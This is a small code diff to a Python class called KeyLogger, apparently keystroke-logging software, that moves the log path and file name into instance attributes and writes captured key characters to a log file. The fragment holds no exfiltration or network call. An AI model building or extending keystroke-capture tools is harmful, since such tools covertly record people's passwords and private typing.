@@ -12,6 +12,9 @@ class KeyLogger:
     }
 
     def __init__(self):
+        self.path = path
+        self.logs = logs_file
+
         self.data = []
         self.count = 0
         self.caps_lock = 0
@@ -30,7 +33,7 @@ class KeyLogger:
             self.data = []
 
     def write_file(self, data):
-        with open(path + logs_file, 'a') as f:
+        with open(self.path + self.logs, 'a') as f:
             for k in data:
                 char = str(k).replace("'", "")
 
